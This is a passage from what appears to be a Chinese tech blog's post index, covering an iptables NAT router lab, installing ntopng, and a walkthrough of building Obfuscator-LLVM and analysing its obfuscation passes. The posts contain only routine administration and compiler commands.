iptables-save把规则保存到文件中，再由目录rc.d下的脚本（/etc/rc.d/init.d/iptables）自动装载，使用命令iptables-save来保存规则。\n一般用iptables-save \u003e /etc/sysconfig/iptables 生成保存规则的文件/etc/sysconfig/iptables，也可以用service iptables save它能把规则自动保存在/etc/sysconfig/iptables中。\n当计算机启动时，rc.d下的脚本将用命令iptables-restore调用这个文件，从而就自动恢复了规则。\niptables的简单应用 由于网络安全课程的实验，特地来学习iptables，可以把实验当作一个应用示例\n实验大致如下：\n 一台windows虚拟机，内网环境，无法直接访问外网 一台linux虚拟机，两个网卡，一个用于连接外网，一个用于连接内网(即windows虚拟机) 目标：利用iptables将linux配置成路由器，windows虚拟机通过路由器访问Internet  实验环境：Ubuntu 18.04和windows server2016\n刚开始认为创建网卡，便在虚拟机的ubuntu里创建了一个虚拟网卡，后面才发现不对，构建不了内网环境，之后才发现是在vmware中添加物理网卡(模拟的)构建内网环境。\n所以首先为ubuntu创建两个网卡，一个能访问外网(使用NAT)，另外一个仅内网(vmware里的仅主机，LAN那个我没搞懂，应该也是可以的)\n在linux中，用命令sudo vim /etc/network/interfaces修改网卡配置如下：\n# interfaces(5) file used by ifup(8) and if down(8) auto lo iface lo inet loopback auto ens33 iface ens33 inet static address 192.168.52.128 netmask 255.255.255.0 gateway 192.168.52.1 auto ens38 iface ens38 inet static address 172.16.0.10 netmask 255.255.255.0 修改后，重启网络配置\n1 2 3  sc@sc-virtual-machine:~$ sudo /etc/init.d/networking restart [ ok ] Restarting networking (via systemctl): networking.service. sc@sc-virtual-machine:~$   还有一点，要开启linux的ip转发功能，命令如下：\n1 2 3 4 5  root@sc-virtual-machine:/home/sc# echo 1 \u003e /proc/sys/net/ipv4/ip_forward $ sudo vim /etc/sysctl.conf # net.ipv4.ip_forward = 1 # 取消上面这个注释,开启linux转发 sc@sc-virtual-machine:~$ sudo sysctl -p   在sysctl.conf里，本来就有注释的转发配置语句，取消注释即可，用命令重新加载内核参数，当然，此时重启linux虚拟机也不是不可以\n在windows做如下配置\n控制面板-\u003e网络和Internet-\u003e网络和共享中心-\u003e本地连接-\u003e属性-\u003eInternet协议版本4（TCP/IPv4）-\u003e属性\n特别地，要将windows网关配置为linux的内网网卡地址\n然后要记得，DNS服务器要和linux主机的一致\n假如，windows虚拟机能ping通linux主机，但是linux主机ping不通windows，则需要关闭windows的防火墙，或者在windows防火墙中，在入站规则内打开ICMP回显\n控制面板-\u003e系统和安全-\u003eWindows防火墙-\u003e高级设置-\u003e入站规则-\u003e文件和打印机共享（回显请求-ICMPv4-In）-\u003e右键-\u003e启用规则\niptables转发 用iptables做nat，命令如下\n1 2 3 4  sc@sc-virtual-machine:~$ # sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sc@sc-virtual-machine:~$ sudo iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o ens33 -j MASQUERADE sc@sc-virtual-machine:~$ sudo iptables -A FORWARD -i ens38 -j ACCEPT   将来自172.16.0.0/24内网的流量转发到ens33，MASQUERADE是指用该网卡上的IP来替换源地址IP，对于IP不固定，如dhcp自动分配ip的情况下使用，这边由于是静态ip，不加该选项也是可以的\n运行完命令后，在windows主机就可以ping通baidu.com了，实验就完成了\n","description":"learning about iptables","tags":["linux","network","security"],"title":"iptables","uri":"/posts/iptables/"},{"categories":["network"],"content":"Ntop  参考：\nGithub-ntop\nGithub-ntop/ntopng\nNtopng\nNtopng-userguide\n运用Ntop监控网络流量\n Ntop是一种监控网络流量的工具，而Ntopng是基于web的高速流量分析和流收集工具，是ntop的下一代，ntopng基于libpcap，并且以可移植的方式编写\n Ntop的功能：\n 自动从网络中识别有用的信息； 将截获的数据包转换成易于识别的格式； 对网络环境中通信失败的情况进行分析； 探测网络环境中的通信瓶颈,记录网络通信的时间和过程。   使用 我在ubuntu18.04上装ntopng，linux就是这么简单，一行命令解决\n1  $ sudo apt-get install ntopng   运行示例如下，运行后访问 http://localhost:3000\n进入后要先注册，默认admin/admin，强制改密码，需要5位数，我改成了admin/12345\n以下是所有主机\n这是其主页，ens33是桥接外网的网卡\n流量监控如下\n针对某个流量的监控：我主机和虚拟机相互ping\n","description":"Something about Ntop and Ntopng","tags":["ntop","network"],"title":"Ntop","uri":"/posts/ntop/"},{"categories":["reverse","llvm","compiler"],"content":"llvm  参考：\nLLVM官网\nLLVM-docs ：注意要查看对应版本的文档，每个版本文档都有所改变\nGithub-llvm/llvm-project\nGithub-llvm-mirror/llvm\nLLVM基础(IR简介\u0026CFG图生成\u0026可视化)：可以生成可视化的IR流程图\n参考的GitHub\nGithub-heroims/obfuscator ：移植好的ollvm9.0等\nOLLVM代码混淆移植与使用 ：heroims的博客\nGithub-iamywang/obfuscator\nGithub-HikariObfuscator/Hikari\nGithub-GoSSIP-SJTU/Armariris\nGithub-obfuscator-llvm/obfuscator ：官方版本\nobfuscator-wiki\npediy.com---[原创]ollvm快速学习\nllvm入门\nOLLVM代码混淆移植与使用\nllvm学习（三）：移植ollvm等作品到单独编译的Pass\n蓝色的味道：谁说不能与龙一起跳舞：Clang / LLVM\nOLLVM代码混淆移植与使用\nllvm入门笔记\nllvm编译流程\nLLVM学习总结与OLLVM项目分析\nObfuscator-llvm源码分析\nollvm源码分析\n[原创]ollvm源码分析 - Pass之Flattening\n[原创]ollvm源码分析 - Pass之SplitBaiscBlocks\nGoSSIP安全研究项目：孤挺花（Armariris） LLVM混淆框架\n为OLLVM添加字符串混淆功能\nllvm之旅第四站 － 编写Pass\nGithub-haidragon / study_obscure\n[原创]Fllvm（Fuck-ollvm）介绍\n 啥是LLVM？  [原创]LLVM了解篇剧场版\n 以上这篇文章简要地介绍了LLVM\nLLVM：Low Level Virtual Machine(最初)\n官方定义：LLVM是一个模块化和可重用的编译器和工具链技术的集合\nLLVM最初是在2000年由伊利诺伊大学香槟分校(UUIC)的学生Chris Lattner及其硕士顾问Vikram Adve创建的研究项目，并在2003年发布第一个正式版本，目的是提供一种基于SSA的现代编译策略，这种策略能够支持任何编程语言的静态和动态编译。\n有意思的是，他的作者原本想要写一个低层虚拟机的，然而他并没有被当成虚拟机来用，逐渐地偏离了他原本的方向。现在llvm不是任何单词的缩写，而是一种体系，包含了一系列的项目\n对于LLVM核心（LLVM Core）来说，它是一个编译器基础设施框架，它包含了为我们编写编译器一系列的库（如程序分析、代码优化、机器代码生成等），并且提供了调用这些库的相关工具，如llvm-opt可以调用LLVM优化相关的库，llvm-mc可以调用LLVM机器代码生成相关的库。并为此提供了一个非常方便简单、具备类型的、平台无关的统一中间代码语言，称之为LLVM IR.\n以上是一个正常编译器的流程，源代码经过前端编译成中间代码，在经过优化和后端生成相应的机器码，即可执行文件\nLLVM编译一个源文件的过程：预处理 -\u003e 词法分析 -\u003e Token -\u003e 语法分析 -\u003e AST -\u003e 代码生成 -\u003e LLVM IR -\u003e 优化 -\u003e 生成汇编代码 -\u003e Link -\u003e 目标文件\n 其中IR(intermediate representation)是前端语言生成的中间代码表示，也是Pass操作的对象，它主要包含四个部分：\n（1）Module：比如一个.c或者.cpp文件。\n（2）Function：代表文件中的一个函数。\n（3）BasicBlock：每个函数会被划分为一些block，它的划分标准是：一个block只有一个入口和一个出口。\n（4）Instruction：具体的指令。\nIR中各部分的具体关系如下图：\n 拿个例子来说就是：首先，我们有C代码程序文件，然后经过了Clang前端（或者古老的llvm-gcc前端，这是在Clang出现以前使用的前端，可以产生LLVM IR），然后会产生LLVM IR。在这里，我们可以发现LLVM IR是以.bc结尾，缩写代表的单词是bitcode，它是序列化的数据，用以存储在磁盘中。而LLVM IR非常牛逼的创建了三种LLVM IR表示格式，除了bitcode这种用以存储的格式，第二种是用于人类可读的的格式，一般以.ll结尾。\n1  $ clang a.c -S -emit-llvm# 生成.ll可读文件   这条命令即可产生.ll文件\n而第三种格式则是内存表示格式，这一般是用于我们程序开发，去操作LLVM IR。那么这里面有一个宏观的概念，那就是一个编译单元（即一个.c文件），在LLVM IR中代表着一个Module，而一个Module里面含有Global Value，主要包括Global Variable 和 Function，而至于Global Alias大家接触比较少，我们暂时忽略。而一个Function里面包含着Basic Block，而一个 Basic Block里面包含着指令，如add。那么关系你可以认为是Module -\u003e Function -\u003e Basic Block -\u003e Instructions. 这是一个宏观的认识，需要具备。而这一个也就是我们常常去查阅的相关LLVM IR的API，如：llvm-GlobeValue\n而这里明确的一点是，这三者是完全等价的，并且可以转换的\n再回到上面的流程图，即产生.bc的阶段。产生完毕后，它这里直接进入llvm-link阶段，其实不太完整。若是我们使用了O2等优化，我们在这里还会经历一个优化的阶段，即对这一个编译单元的优化，大约包括了40多种优化Pass，如死代码消除，内联等。而经过优化后，依然是.bc文件，然后再进入llvm-link阶段。而在llvm-link阶段，所要做的其实就是把多个.bc文件合并成一个.bc文件，并且做链接时优化，在这篇文章中提到过一个例子：LLVM Link Time Optimization，可以查阅一下是如何进行链接时优化的。\n而经过llvm-link阶段后，我们得到了一个新的.bc文件，那么我们会再次进入优化阶段，重新再进行一次优化。因为经过llvm-link后，我们的IR结构可能发生了一些变化，从而可能更有利于我们优化，得到更优化的IR。而这一步骤后，可以得到最终优化后的.bc，正式进入代码生成阶段。\n而在这一幅图中，只列举出来了一个llc，即走机器代码生成的路径。其实对于LLVM来说，还可以有一个过程，那就是lli，即解释执行LLVM IR。不过我们这里不多谈，我们重点在机器代码生成。那么llc的作用就是把LLVM IR 编译成汇编文件.s，这里你可以把LLVM IR想象成一个编程语言，然后经过了llc编译器，最后产生了汇编文件。如同C程序，经过Clang，产生了LLVM IR一般。那么，产生了汇编文件以后，就可以调用系统的汇编器，如GNU的as，从而产生目标文件object file，即.o文件了。而细心的童鞋可能注意到了这里还有一条路径是llvm-mc，直接走生成object file的过程。而这条路径在如今来说，并不是每个平台都会走，核心在于LLVM本身的集成汇编器，即-fintegrated-as，使用集成汇编器既可以使用MCLoweing到MCInst，再使用MCStreamers直接到.o，当然也可以到.s。而目前本身的集成汇编器，我认为是并非完美，但是以发展趋势来看，会大一统的，从而做到没有平台差异，这也是LLVM做集成汇编器的一大理由。而生成完.o文件，剩下的过程就很简单了，就是链接器链接相关的库，然后和目标文件一起生存可执行文件.out / .exe了。\n1 2 3 4 5  # 二进制代码形式 $ clang -emit-llvm -c main.c -o main.bc # 可读文本代码形式 $ clang -emit-llvm –S -c main.c -o main.ll     llvm 和 clang 的关系   对于 LLVM 来说，其前端是 clang，在编译源码文件的时候使用的编译工具也是 clang。 而生成中间 IR 代码后，llvm需要对 IR 代码进行一些操作，例如添加一些代码混淆功能。LLVM 的做法是通过编写 Pass(其实就是对应的一个个模块，每个类实现不同的功能)来实现混淆的功 能。所以实现混淆，其实就是编写功能性的 Pass\nObfuscator-LLVM Obfuscator-LLVM是由瑞士伊夫尔东莱班的应用科学与艺术大学信息安全小组（HEIG-VD）于2010年6月发起的一个项目。\n该项目的目的是提供LLVM编译套件的开源分支，该套件能够通过代码混淆和防篡改来提高软件安全性。由于我们目前大部分工作在中间表示（IR）级别，因此我们的工具与所有编程语言（C，C ++，Objective-C，Ada和Fortran）和目标平台（x86，x86-64，PowerPC，PowerPC-64）兼容。\nLLVM当前支持的ARM，Thumb，SPARC，Alpha，CellSPU，MIPS，MSP430，SystemZ和XCore）。\nObfuscator-LLVM的目的主要是在编译时增强软件就对抗向工程和编译时修改（动态调试？）\nInstall 可以直接从github上下载源码\n1 2 3 4 5 6  $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build # 如果不想跑测试用例加上-DLLVM_INCLUDE_TESTS=OFF  $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ $ make -j7   然而我在4核4G虚拟机里编译将近2h，还报错了tcl\n我现在只想再来几根内存条 :(\n1 2 3 4 5 6  error:virtual memory exhausted:Cannot allocate memory $ make -j7 \u003e\u003e40% $ make -j4 \u003e\u003e95% $ make -j2 \u003e\u003e100%   o-llvm手动打包  http://www.few.vu.nl/~lsc300/LLVM/doxygen/index.html\nAPI Document\n 因为我下的ollvm9.0的-fla有bug，所以决定亲自打包一波，顺便再深入了解ollvm\n由Diffinity将ollvm4.0和llvm4.0进行对比，发现了以下文件的不同，也就意味着我们将ollvm打包进最新的llvm也需要修改以下文件。\n1 2 3 4 5 6 7 8 9 10 11 12  ./include/llvm/Transforms/Obfuscation/ # obfuscation的头文件 ./include/llvm/Transforms/CryptoUtils.h # obfuscation的头文件 ./lib/Transforms/IPO/LLVMBuild.txt ./lib/Transforms/IPO/PassManagerBuilder.cpp # Pass注册 ./lib/Transforms/Obfuscation/ # obfuscation source code ./lib/Transforms/CMakeLists.txt ./lib/Transforms/LLVMBuild.txt ./tools/clang # 集成clang,要在gitignore里取消clang的注释 ./.gitignore ./CMakeLists.txt ./CODE_OWNERS.TXT ./LICENSE.TXT   从自己的github的obfuscator仓库中clone下来，注意一定要clone，直接下载downloadzip没有.git信息，虽然他真的很慢。\n然后创建自己的llvm9.0分支\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  $ git clone git@github.com:Magic-King/obfuscator.git Cloning into 'obfuscator'... remote: Enumerating objects: 86723, done. remote: Total 86723 (delta 0), reused 0 (delta 0), pack-reused 86723 Receiving objects: 100% (86723/86723), 132.79 MiB | 35.00 KiB/s, done. Resolving deltas: 100% (15346/15346), done. $ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/clang-425.0.24 remotes/origin/llvm-3.3 remotes/origin/llvm-3.4 remotes/origin/llvm-3.5 remotes/origin/llvm-3.6.1 remotes/origin/llvm-4.0 remotes/origin/master $ git branch -r origin/HEAD -\u003e origin/master origin/clang-425.0.24 origin/llvm-3.3 origin/llvm-3.4 origin/llvm-3.5 origin/llvm-3.6.1 origin/llvm-4.0 origin/master $ git remote add origin git@github.com:Magic-King/obfuscator.git fatal: remote origin already exists. $ git checkout -b llvm-9.0 Switched to a new branch 'llvm-9.0 $ git push origin llvm-9.0 Total 0 (delta 0), reused 0 (delta 0) remote: remote: Create a pull request for 'llvm-9.0' on GitHub by visiting: remote: https://github.com/Magic-King/obfuscator/pull/new/llvm-9.0 remote: To github.com:Magic-King/obfuscator.git * [new branch] llvm-9.0 -\u003e llvm-9.0   然后把最新的llvm9.0.1放入obfuscator/文件夹下，把clang放入 obfuscator/tools/clang里\n然后将obfuscator-llvm4.0移植到obfuscate里，具体可以查看我的github的commit记录\n网址如下：https://github.com/Magic-King/obfuscator/commits/llvm-9.0\n但是，手动打包之后，-fla还是有问题，不过其他选项倒是没问题，应该是-fla和llvm-9.0不兼容的问题\no-llvm的特点  nstructions Substitution -mllvm -sub：指令替换 Bogus Control Flow -mllvm -bcf：伪控制流 Control Flow Flattening -mllvm -fla：激活控制流扁平化 Functions annotations：可以针对一些特定函数进行混淆（选择性混淆）  nstructions Substitution 这种混淆技术的目标仅在于用功能上等效但更复杂的指令序列代替标准的二进制运算符（如加，减或布尔运算符）。当几个等效的指令序列可用时，随机选择一个。\n这种混淆非常简单，并且不会增加很多安全性，因为可以通过重新优化生成的代码轻松地将其删除。但是，如果伪随机数发生器使用不同的值作为种子，则指令替换会在生成的二进制文件中带来多样性。\n当前，只有整数运算符可用，因为用浮点值替代运算符会带来舍入误差和不必要的数值误差。\n可用的编译器选项：\n -mllvm -sub：激活指令替换 -mllvm -sub_loop=3：如果激活了通行证，则将其应用到功能上3次。默认值：1。  wiki中提到了可替换的运算：add、sub、and、or、xor。\nBogus Control Flow 该方法通过在当前基本块之前添加一个基本块来修改函数调用图。这个新的基本块包含一个不透明的谓词，然后有条件地跳转到原始的基本块。\n原始的基本块也将被克隆并填充以随机选择的垃圾指令。\n可用的编译器选项：\n -mllvm -bcf：激活伪控制流程 -mllvm -bcf_loop=3：如果激活了通行证，则将其应用到功能上3次。默认值：1 -mllvm -bcf_prob=40：如果激活了通行证，则基本团块将以40％的概率被混淆。默认值：30  Control Flow Flattening 此过程的目的是完全弄平程序的控制流程图。简单来说就是拆分基本块并置于无限循环中，程序流程由switch控制\n可用的编译器选项：\n -mllvm -fla：激活控制流展平 -mllvm -split：激活基本块分割。一起使用可改善展平性。 -mllvm -split_num=3：如果激活了通行证，则在每个基本块上应用3次。默认值：1  Functions annotations 注释使您可以按功能指定要应用（或不应用）混淆的功能\n用法：只需向您的函数添加属性。\n例如：\n1 2 3 4  int foo() __attribute((__annotate__((\"fla\")))); int foo() { return 2; }   您可以为每个功能添加使用一个或多个注释。如果要禁用功能的混淆，也可以使用“反向标志”（例如，如果要禁用功能的伪造控制流，请使用注释“ nobcf”）。\n对比 我自己写了一个测试文件，然后用于clang和ollvm混淆的各种测试\n源代码如下，关于混淆之后的执行文件和源文件打包在了here\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main(){ printf(\"Hello LLVM\"); char *a= \"Hello fucking bug\"; //a = \"Hello O-LLVM!I will fuck you!\"; \tint sum = 0; for (int i = 1;i\u003c=10;i++){ sum += i; } printf(\"%s\\nthe answer of what i do is %d\\n\",a,sum); printf(\"test finished!\\n\"); return 0; }   以下是gcc编译的文件通过ida逆向所得的流程图\n以下是用clang9.0 编译test的流程图，可见大体的流程是和gcc相同的，不过通过ida的万能F5反编译出来的源码，clang版本的基本和源码差不多，gcc版本的循环的变量挺奇怪的，但是总体流程还是不变的\n下图是加了ollvm的bcf选项的反汇编结果，可见添加了许多虚假控制流，真正执行的循环是左半部分，他把for循环结束之后的该执行的语句放到了右半部分，在添加虚假控制流\n看反汇编的代码，他把for循环放入了一个while循环里，然后用一个if控制是否结束原来的循环，加入结束，就用goto到达最后执行的语句里，这里又写了一个假的while，经我看下来，这个while也就执行一次，循环就退出了，果然混淆后想搞懂流程贼麻烦\nollvm编译fla选项，由于适配llvm9.0的fla选项失败了，所以这边是引用-split选项得出来的反汇编结果，split也就是fla平坦化所选择的选项\n对比原来的clang反汇编出来的结果是不是多了许多可供选择的路，正如wiki所说是用switch控制的\n反汇编出来的代码嵌套了多层while循环，并加入if判断，低层应该就是用switch实现的，然后再某几个switch case加入break破坏循环达到控制流程的目的\n这个是最简单的，和clang编译的版本对比，主要区别在于分块之后的左边的块，他把其指令进行了替换，具体咋替换看我后面的源码分析\n不过可惜的是，这个代码替换对于ida来说好像不是什么大事情，利用万能的F5反汇编时，他成功把循环里的加法还原了，产生的代码和clang版本没混淆的一模一样\n可能这需要和其他几个选项一起使用会比较好\n//TODO：字符串混淆\no-llvm源码分析 通过我们手动将ollvm与llvm9.0打包的过程，我们可以非常清楚地了解了ollvm的源码结构\n1 2 3 4 5 6 7  ./include/llvm/Transforms/Obfuscation/ # obfuscation的头文件 ./include/llvm/Transforms/CryptoUtils.h # obfuscation的加密工具类的头文件 ./lib/Transforms/IPO/LLVMBuild.txt # pass模块编译的模块注册 ./lib/Transforms/IPO/PassManagerBuilder.cpp # Pass注册 ./lib/Transforms/Obfuscation/ # obfuscation source code ./lib/Transforms/CMakeLists.txt # 加入子目录 ./lib/Transforms/LLVMBuild.txt # 加入LLVM编译子目录   我们知道，ollvm就是通过编写llvm的pass来将其中间语言IR进行不同程度的混淆\nBogus Control Flow Bogus Control Flow的功能是为函数增加新的虚假控制流和添加垃圾指令。\n其中文件位于./include/llvm/Transforms/Obfuscation/BogusControlFlow.cpp\n其中的注释跟我们非常形象的演示了其的工作内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  // This file implements BogusControlFlow's pass, inserting bogus control flow. // It adds bogus flow to a given basic block this way: // // Before : // entry // | // ______v______ // | Original | // |_____________| // | // v //\treturn // // After : // entry // | // ____v_____ // |condition*| (false) // |__________|----+ // (true)| | // | | // ______v______ | // +--\u003e| Original* | | // | |_____________| (true) // | (false)| !-----------\u003e return // | ______v______ | // | | Altered |\u003c--! // | |_____________| // |__________| //   他的Cpp文件先写好了Debug信息，再定义了以下为pass提供的选项常量\n其中，我们最常见的 cl::opt\u003cdata_type\u003e是用来传递llvm之间pass共享的参数，也就是我们在编译时所给的-bcf_prob = 50这个命令行编译参数可以传递到pass的核心所在\ncl::opt这个用法让我想起了c++中std::cout、using namespace std，经查询发现，这是一个类似于python的import的一个语法，namespace是为了和c的.h区分开来\n 详细可见：\nC++ Namespace 详解\nC++ 命名空间\nC++/C++11中命名空间(namespace)的使用：这里面有一段折磨人的代码，读懂了应该就懂了c++的namespace的作用域\n 目前读下来，最常见的应该就是namespace llvm和 namespace cl了\n1  struct BogusControlFlow : public FunctionPass   这里，BogusControlFlow继承至FunctionPass，因此它的入口函数即为runOnFunction\n struct的继承和class的继承有很大的区别，struct的继承是基于子类(struct)的public继承，class是基于子类(class)的private继承\n 整个namespace写了一个struct 类用于混淆\n其中runOnFunction为入口函数，先判断bcf的两个参数-bcf_loop和-bcf_prob是否符合正确范围内，然后检查是否启用了-bcf选项，假如启用了，则进入核心函数bogus(F);，然后继续处理doF(*F.getParent());\n在bogus()函数里，先实现了Debug的相关部分，在每次进入函数前输出debug信息，用于处理debug模式下的-bcf选项。然后定义一个list链表，用于储存BasicBlock，BasicBlock用for循环利用迭代器的模式从传入的 F 获取。一个while循环，当基本块非空时，利用cryptoutils工具类获取随机数，从链表中选择基本块进行混淆(用addBogusFlow(basicBlock, F);函数)，并标记已混淆过该块，防止重复混淆某一基本块，否则就不混淆。然后弹出链表中的第一块，这样直到混淆次数为0为止。\naddBogusFlow()函数，将给定的基本块进行添加虚假控制流。首先获得一个基本块Basic Block，利用createAlteredBasicBlock()函数生成一个与原基本块相似的Basci Block，然后利用BasicBlock-\u003egetTerminator()-\u003eeraseFromParent();把他们的父母节点擦除，然后创建两个条件恒为真的左右子节点，然后将其创建分支循环。（其过程是创建一个恒真的分支，进入分支的基本块后，加入一个判断，若真进入原基本块，若假进入假基本块，经假基本块的垃圾代码之后，再进入原基本块。在为真时，进入原基本块，将基本块主体执行完之后，在加入分支判断，正确返回结果，错误跳转至混假基本块进行循环）\n https://sq.163yun.com/blog/article/175307579596922880：这个讲的特别形象，配合着图一起阅读，这边借用其一张图\n 1 2 3  int add(int a, int b){ return a+b; }   如图，对于上述函数，分离其基本块，创建一个入口entry，然后加入一个恒真的分支，把生成相似的基本块放至错误分支里，即其永远不会执行的垃圾代码，将所执行的基本块放入正确分支里\ncreateAlteredBasicBlock()函数用于生成与给定基本块相似的基本块，将操作运算符进行重新映射，重新映射节点，重新映射对应的数据，然后加入随机的指令\n对于doF()函数，该函数的功能是将Function中所有为真的判断语句进行替换，比如之前的1.0 == 1.0 。它的思想是定义两个全局变量x、y并且初始化为0，然后遍历Module内的所有指令，并将所有的FCMP_TRUE分支指令替换为y\u003c10 || x*x(x-1)%2 ==0，我们从反汇编的代码来看，很明显的就有y\u003c10这个分支\nFlattening Flattening的主要功能是为函数增加switch-case语句，使得函数变得扁平化。下面就对它的实现源码进行分析。\n其中文件位于./include/llvm/Transforms/Obfuscation/Flattening.cpp\nFlattening继承了FunctionPass，因此它的入口函数即为runOnFunction。在runOnFunction函数的具体实现中，首先判断是否包含了启动-fla的命令。在编译目标程序代码时，如要启动fla模块，需要带上参数-mllvm -fla。\n参数检查完毕之后，调用flatten函数。flatten函数是该Pass的核心，下面对该函数进行分析。\n先是声明了一些后面要用的变量，然后创建了一个数组，用来存储随机数种子\n1 2 3 4 5 6 7  // SCRAMBLER  char scrambling_key[16]; llvm::cryptoutils-\u003eget_bytes(scrambling_key, 16); // END OF SCRAMBLER // Lower switch  FunctionPass *lower = createLowerSwitchPass(); lower-\u003erunOnFunction(*f);   后两行调用了外部一个外部pass：creatLowerSwitchPass()，用来消除当前函数的内部用switch方式的代码，将其全转换成if else的调用，方便后面的代码块分割\n然后一个for循环，像bcf那样，将函数分为各个基本块储存在vector\u003cBasicBlock *\u003e origBB的一个向量数组里，等等的代码是针对基本块的操作，就像乐高那样一块块进行拼接。\n然后的话，若只有一个以下的基本块，那么无法平坦化，直接返回false\n然后开始遍历基本块，先把第一块从vector数组中移除，因为按照他的流程平坦化的设计，第一块进行单独处理，作为整个混淆流程的开始逻辑，所以紧接着先对第一块进行处理。\n检查第一块中是否包含条件跳转分支，如果包含条件跳转分支，则按照条件分支的位置进行代码块分割，分割逻辑跟SplitBasicBlock的逻辑一致，整个分割的目的也是为了后面进行流程平坦化准备的\n然后开始是核心代码了\n1 2 3 4 5 6 7  // Create switch variable and set as it  switchVar = new AllocaInst(Type::getInt32Ty(f-\u003egetContext()), 0, \"switchVar\", insert); new StoreInst( ConstantInt::get(Type::getInt32Ty(f-\u003egetContext()), llvm::cryptoutils-\u003escramble32(0, scrambling_key)), switchVar, insert);   这一段创建了一个switch用的变量，相当于是switch(caseVar)，并通过StoreInst进行赋值，这时就用上了之前的随机数种子，将生成的随机数用作case。\n接着创建了两个空的基本块loopEntry和loopEnd，然后将switch语句放入loopEntry中，将第一块基本块连接上loopEntry，loopEnd跳转回loopEntry，在switch语句加入默认的swDefault基本块大概成型了\n大概就和下面这个流程图差不多了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //\t+--------+ // |first bb| // +---+----+ // | // +----v----+ // |loopEntry| \u003c--------+ // +----+----+ | // | | // +----v---+ | // | switch | | // +----+---+ | // | | // +------------+ | // | | //\t+------v-------+ | //\t| default case | | //\t+------+-------+ | // | | // +-----------+ | // | | // | | // v | // +-----+------+ | // | loopEnd +---------+ // +------------+   骨架成型了，接下来把剩余的基本块往switch语句中填入就行了。\n但是填入之后肯定是个死循环了，我们这时候就要活用flatten的思想，控制switch case的caseVar的值来达到控制流程的目的——很简单，在每个基本块即每个case之后，补上一条对caseVar的值更新的语句即可达到控制流程的目的\n剩下代码就是来更新每个case中代码块对caseVar的操作了，怎么更新呢，很简单，就是更新成当前代码块原后续逻辑块在当前这个代码框架下的case值\n接下来的操作分三种情况来进行\n  case中代码块没有后续块，那就是一个返回块，不需要更新caseVar\n  case中代码块只有一个后续块，也就是一个无条件跳转分支，直接更新成后续块对应的case即可\n  case中代码块有2个后续块，也就是一个条件跳转分支，通过successor对象（就是后续块的意思）直接在switch结构中查找出对应的case值\n1  SelectInst *sel =SelectInst::Create(br-\u003egetCondition(), numCaseTrue, numCaseFalse, \"\",i-\u003egetTerminator());   如上，使用llvm的SelectInst来实现分支选择，像227行写的，根据br-\u003egetCondition()是否为True来决定是跳转到numCaseTrue还是numCaseFalse\n  最后这样就成功平坦化成功了\n拿一个例子来理解：\n1 2 3 4 5 6 7 8 9 10 11  int func1(int a,int b) { int result; if(a\u003e0){ result=a+b; } else{ result=a-b; } return result; }   如下图，这是原本上面这个函数的IR图\n先判断第一个基本块有没有if语句，我们这个函数刚开始明显没有，先将第一块分开成一个基本块\n然后创建三个基本块loopEntry、loopEnd、swDefault，组成如下图左边的流程\n这时候，switch语句我们已经可以看见了，接下来就是将vector里存储的每个基本块加入switch-case语句中，每一个basicblock对应一个case，并且caseVar为刚开始产生的随机数值，如下图所示\n添加完全部基本块之后，需要修改每个基本块的跳转关系，使得每个基本块执行完毕之后，会重新设置caseVar的值，从而跳转到loopEnd块，然后回到switch-case的判断语句中，能够顺利跳转到下个case，处理后即为下图成型\nSubstitution Substitution的主要功能是对程序的一些指令进行替换。\n其中文件位于./include/llvm/Transforms/Obfuscation/substitution.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #define NUMBER_ADD_SUBST 4 #define NUMBER_SUB_SUBST 3 #define NUMBER_AND_SUBST 2 #define NUMBER_OR_SUBST 2 #define NUMBER_XOR_SUBST 2  static cl::opt\u003cint\u003e ObfTimes(\"sub_loop\", cl::desc(\"Choose how many time the -sub pass loops on a function\"), cl::value_desc(\"number of times\"), cl::init(1), cl::Optional); // Stats STATISTIC(Add, \"Add substitued\"); STATISTIC(Sub, \"Sub substitued\"); // STATISTIC(Mul, \"Mul substitued\"); // STATISTIC(Div, \"Div substitued\"); // STATISTIC(Rem, \"Rem substitued\"); // STATISTIC(Shi, \"Shift substitued\"); STATISTIC(And, \"And substitued\"); STATISTIC(Or, \"Or substitued\"); STATISTIC(Xor, \"Xor substitued\");   如上代码，通过该文件的宏定义，就可知每种运算替换的方式有多少种，可以对哪些指令进行替换：很明显的有：加减、位的与、或、异或，五种运算的替换\n而注释的是未实现的运算替换，在官方wiki里可以知道，为了保证混淆再恢复之后的正确性，避免浮点数运算带来的程序误差，所以没有实现这些运算的替换（乘、除、取余，移位）\n在源文件里，类似地，在相应的namespace里定义了这些内容，与之前两个混淆方式类似，substitution继承于FunctionPass，以runOnFuntion函数为入口，里面再判断flag参数正确之后，朴实无华地调用了substitute(tmp)函数己行混淆\n主函数substitute()很简单，用一个while循环维护混淆次数(即给的flag参数-sub_loop)，然后两层for循环。第一个for循环用来遍历函数中的基本块(Basic Block)，第二个for循环用于遍历每个基本块中的所有指令，然后采用一个switch-case语句用来针对不同指令的不同替换操作，case里用随机数来决定用哪种方式去替换\n接下来的所有代码都是其替换方式的实现\n Instructions-Substitution：在其官方wiki里都有说明是怎样的替换方式，在其注释下代码很好理解，相关的函数不懂就查查llvm的函数库就可以了\n  Add指令支持4种替换方法，分别是\n a = b - (-c) a = -(-b + (-c)) r = rand (); a = b + r; a = a + c; a = a – r  r = rand (); a = b - r; a = a + b; a = a + r     Sub指令支持3种替换方法，分别是\n a = b + (-c) r = rand (); a = b + r; a = a - c; a = a – r  r = rand (); a = b - r; a = a - c; a = a + r     And 指令支持1种替换方法，分别是\n a = b \u0026 c =\u003e a = (b^~c)\u0026 b    Or指令支持1种替换方法，分别是\n a = b | c =\u003e a = (b \u0026 c) | (b ^ c)     Xor 